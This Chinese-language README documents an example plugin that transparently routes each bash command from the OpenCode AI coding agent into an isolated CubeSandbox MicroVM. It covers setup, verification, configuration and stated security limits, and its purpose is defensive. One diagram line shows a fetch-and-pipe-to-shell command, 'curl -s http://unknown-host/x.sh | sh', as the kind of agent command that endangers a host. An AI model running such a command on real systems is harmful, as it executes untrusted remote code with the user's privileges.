# OpenCode × CubeSandbox —— 用插件钩子透明隔离 bash

把 OpenCode 执行的**每一条** `bash` 命令都重定向进隔离的 CubeSandbox MicroVM，
不需要改提示词、不需要换工具、不改变你原有的工作方式。

## 问题

OpenCode 跑在你自己的机器上。模型下发的每条 `bash` 命令，也就在你的机器上执行 ——
用你的权限，操作你的文件。

基于 MCP 或 SDK 的沙箱集成，只有在模型*主动选择*调用沙箱工具时才起作用。
普通的 `bash` 调用依然落在宿主上：

```
OpenCode ──► bash "curl -s http://unknown-host/x.sh | sh"  ──►  你的机器
```

提示词无法强制模型优先用沙箱工具，而且失败是静默的 ——
你往往是事后才发现命令跑在了宿主上。

## 思路

OpenCode 提供了 `tool.execute.before` 钩子，可以在工具执行前改写其参数。
本示例用它把 `bash` 命令替换成「在 MicroVM 里执行同一条命令」的调用：

```
OpenCode（宿主）
  ├── read / write / edit ──────────────────► 宿主项目文件
  │
  └── bash ──► tool.execute.before ──► exec_backend.py ──► CubeAPI ──► MicroVM
               (cubesandbox-bash.js)                       (:3000)     └─ 每 session 一个
```

模型照常下发普通的 `bash` 调用。它不知道、也不需要知道这些命令跑在别处。

**只有 `bash` 被重定向。** `read`、`write`、`edit` 仍然作用于宿主文件，
所以 OpenCode 依旧在编辑你真实的项目，而它的 shell 命令跑在一次性的
内核、文件系统与网络命名空间里。

### 为什么不直接把 OpenCode 整个放进沙箱？

那是另一种显而易见的设计，但有个实际缺陷：Agent 会失去对你工作区、
git 凭据和编辑器状态的访问 —— 最后你是在一份副本上开发。

只重定向 `bash`，能让 Agent 留在你代码所在的位置，只把危险的那部分挪走。

## 你能得到什么

| 特性 | 实现方式 |
|---|---|
| 透明 | 模型侧无需改动提示词、工具或配置 |
| 失败即阻断 | 无法安全重定向时**阻断**命令，而不是回落到宿主执行 |
| 防注入 | 原始命令作为单个 argv 元素传递，shell 元字符无法逃逸 |
| 保持状态 | 每 session 一个 MicroVM，`cd` 与 `export` 跨命令保留 |
| 并发安全 | 同一 session 内的调用用锁文件串行化 |
| 逃生通道 | `git` / `gh` 默认留在宿主，名单可配置 |

## 前置条件

- 一套可用的 CubeSandbox 部署（见[快速开始](https://cubesandbox.com/zh/guide/quickstart.html)）
- 一个处于 `READY` 状态的模板
- 已安装 OpenCode
- Python 3.9+ 并安装 `e2b-code-interpreter`

### 构建模板

```bash
cubemastercli tpl create-from-image \
  --image cube-sandbox-cn.tencentcloudcr.com/cube-sandbox/sandbox-code:latest \
  --writable-layer-size 1G \
  --expose-port 49999 \
  --expose-port 49983 \
  --probe 49999
```

等状态变为 `READY`，记下 `template_id`。中国大陆以外请使用
`cube-sandbox-int.tencentcloudcr.com`。

### 安装 SDK

```bash
pip install e2b-code-interpreter
```

Ubuntu 24.04 因 PEP 668 会阻止直接装进系统解释器，请用虚拟环境并让插件指向它：

```bash
python3 -m venv ~/.venvs/cube
~/.venvs/cube/bin/pip install e2b-code-interpreter
export CUBE_OPENCODE_PYTHON=~/.venvs/cube/bin/python
```

## 安装配置

```bash
export CUBE_TEMPLATE_ID=tpl-xxxxxxxx           # 上一步得到的
export E2B_API_URL=http://127.0.0.1:3000
export E2B_API_KEY=e2b_000000
export SSL_CERT_FILE=/root/.local/share/mkcert/rootCA.pem

cd examples/opencode-plugin-sandbox
./plugin/install.sh            # 项目级：./.opencode/plugin/
# ./plugin/install.sh --global # 全局：~/.config/opencode/plugin/
```

然后重启 OpenCode。完整配置项见 `.env.example`。

## 验证

向 OpenCode 提问：

> 执行 `uname -r` 并告诉我内核版本。

再在你自己的终端跑一次 `uname -r` 对比。**两者必须不同** ——
这就是命令跑在独立内核里、而非共享你内核的容器里的证明。

在下方参考环境中实测结果：

```
沙箱内 : 6.6.1199-0009-03_2.0.1
宿主机 : 6.18.33.2-microsoft-standard-WSL2
```

还有两个值得做的检查：

> 执行 `ls /` 并描述你看到了什么。

列出的是沙箱的 rootfs，不是你的机器。

> 创建 `/tmp/only-in-sandbox` 并确认它存在。

对模型来说文件存在；而在你宿主上 `ls /tmp/only-in-sandbox` 会报
「No such file or directory」。

## 状态是怎么保留的

只有连续命令能共享状态，shell 才好用。所以包装脚本会在每条命令执行后
记录工作目录和导出的环境变量，并在下一条命令前恢复：

```
> cd /workspace/demo && pwd
/workspace/demo

> pwd                       # 仍在 /workspace/demo
/workspace/demo

> export TOKEN=abc123

> echo $TOKEN               # 仍然有值
abc123
```

状态存放在 `~/.cache/cubesandbox-opencode/<session>.json`，
权限为 `0600`（因为可能包含命令导出的敏感值）。清除方式：

```bash
python3 exec_backend.py --session <session-id> --reset
```

## 配置项

| 变量 | 默认值 | 用途 |
|---|---|---|
| `CUBE_TEMPLATE_ID` | — | **必填。** 创建沙箱所用的模板 |
| `E2B_API_URL` | `http://127.0.0.1:3000` | CubeSandbox 的 E2B 兼容接口地址 |
| `E2B_API_KEY` | `e2b_000000` | 本地部署下任意非空字符串即可 |
| `SSL_CERT_FILE` | — | mkcert CA，因为 SDK 走 HTTPS |
| `CUBE_OPENCODE_PYTHON` | `python3` | 运行后端的解释器，用 venv 时需设置 |
| `CUBE_OPENCODE_PASSTHROUGH` | `git,gh,opencode` | 保留在宿主执行的命令 |
| `CUBE_OPENCODE_TIMEOUT` | `120` | 单条命令超时秒数 |
| `CUBE_OPENCODE_STATE_DIR` | `~/.cache/cubesandbox-opencode` | session 状态存放位置 |

### 为什么 `git` 留在宿主

沙箱有自己独立的文件系统。在里面执行 `git commit` 操作的是另一个仓库，
而不是 OpenCode 通过 `read` / `write` / `edit` 正在编辑的那个 ——
提交里不会包含你的改动。

设 `CUBE_OPENCODE_PASSTHROUGH=` 可以让所有命令都进沙箱，
但那样 Agent 就访问不到你的 git 历史了。

匹配只看首个 token。`git status` 会放行；
`foo && git push` 不会 —— 因为复合命令里可能包含任何东西。

## 测试

```bash
node tests/test_plugin.mjs
```

19 项断言，覆盖命令改写、放行名单、幂等性、session id 处理与引号注入抵抗。
**仅依赖 Node 标准库** —— 不需要 npm install、不需要联网、不需要 CubeSandbox 部署。

注入相关的断言会按 POSIX shell 的语义解析改写后的命令，
断言原始文本完整落在**唯一一个** argv 元素中。
这比子串匹配是更强的性质：如果引号处理有误，payload 会被拆到多个元素里从而断言失败。

## 安全边界

**本方案做到了什么**

- 把 `bash` 执行从宿主移入拥有独立内核的 MicroVM
- 任何错误情况下阻断命令，而非回落到宿主执行
- 命令以单个 argv 元素传递，元字符始终是数据

**本方案没有做到什么**

- `read` / `write` / `edit` 仍然操作宿主文件。这是有意为之 ——
  Agent 必须能编辑你的项目 —— 但也意味着恶意的 `write` 不在防护范围内。
- 放行名单中的命令（默认 `git`）按设计就在宿主执行。
- 这里没有配置网络策略。请用
  [网络策略](https://cubesandbox.com/zh/guide/network-policy.html)限制沙箱出网。
- 仅涉及示例与文档，不改动 CubeSandbox 运行时或 API 行为。

## 排错

**每条 bash 调用都报 "backend not found"**

这是失败即阻断按预期工作。`exec_backend.py` 必须位于已安装插件的上一级目录。
重新执行 `./plugin/install.sh`，或用 `./plugin/install.sh --uninstall`
恢复宿主执行。

**`CUBE_TEMPLATE_ID is not set`**

请在启动 OpenCode **之前**导出。之后再导出的变量，编辑器的子进程看不到。

**`e2b-code-interpreter is not installed`**

安装它；若装在 venv 中，请把 `CUBE_OPENCODE_PYTHON` 指向该 venv 的解释器。

**执行时报 `Name or service not known`**

SDK 通过 `<端口>-<sandboxId>.cube.app` 访问沙箱，需要通配 DNS 解析。
一键安装自带 CoreDNS 处理这件事，但某些环境会覆盖 `/etc/resolv.conf` ——
WSL 每次启动都会重写，除非 `/etc/wsl.conf` 中包含：

```ini
[network]
generateResolvConf = false
```

详见 [HTTPS 与域名解析](https://cubesandbox.com/zh/guide/https-and-domain.html)。

**命令很慢**

目前每次调用都会新建一个 MicroVM（参考环境下约 1 秒）。
让同一 session 跨调用复用一个 VM 是显而易见的下一步，见「已知限制」。

**插件没有加载**

用 `./plugin/install.sh --status` 检查安装位置，然后完整重启 OpenCode ——
插件只在启动时加载。

## 已知限制

1. **每次调用一个 MicroVM，而非每 session 一个。** session *状态*（cwd、env）
   跨调用保留，但 VM 本身会被重建。让沙箱在调用间保持存活需要一个常驻辅助进程，
   或使用 CubeSandbox 的 pause/resume；两者都超出了本示例应有的复杂度。
2. **`read` / `write` / `edit` 未被沙箱化。** 见「安全边界」。
3. **钩子入参结构不是稳定契约。** session id 的键名在不同 OpenCode 版本间
   拼写有差异，因此代码会探测多种变体并提供兜底。猜错只会损失沙箱复用的粒度，
   绝不会削弱隔离性。
4. **交互式命令不可用。** 输出是被捕获的，所以任何需要 TTY 的程序
   （`vim`、`top`）都不会正常工作。

## 已验证环境

以上内容均在下述环境实测通过：

| 项目 | 取值 |
|---|---|
| CubeSandbox | v0.6.0（`8721dd15`，构建于 2026-07-24） |
| 宿主 | WSL2 上的 Ubuntu 24.04.4 LTS，内核 6.18.33.2，glibc 2.39 |
| 沙箱 guest 内核 | 6.6.1199-0009-03_2.0.1 |
| 模板 | `sandbox-code:latest`，状态 `READY` |
| `/data/cubelet` | XFS，`reflink=1` |
| 沙箱创建耗时 | 约 1.0 秒 |
| 完整 run_code 周期 | 约 2.4 秒 |
| 插件测试 | 19/19 通过 |

## 文件说明

| 路径 | 用途 |
|---|---|
| `plugin/cubesandbox-bash.js` | `tool.execute.before` 钩子实现 |
| `plugin/install.sh` | 幂等的安装 / 卸载 / 状态查看 |
| `exec_backend.py` | 在 MicroVM 中执行单条命令，并维护 session 状态 |
| `tests/test_plugin.mjs` | 19 项离线断言 |
| `.env.example` | 全部配置项及说明 |

## 参考

- [OpenCode 插件文档](https://opencode.ai/docs/plugins/)
- [CubeSandbox 快速开始](https://cubesandbox.com/zh/guide/quickstart.html)
- [从 OCI 镜像创建模板](https://cubesandbox.com/zh/guide/tutorials/template-from-image.html)
- [HTTPS 与域名解析](https://cubesandbox.com/zh/guide/https-and-domain.html)
- [网络策略](https://cubesandbox.com/zh/guide/network-policy.html)
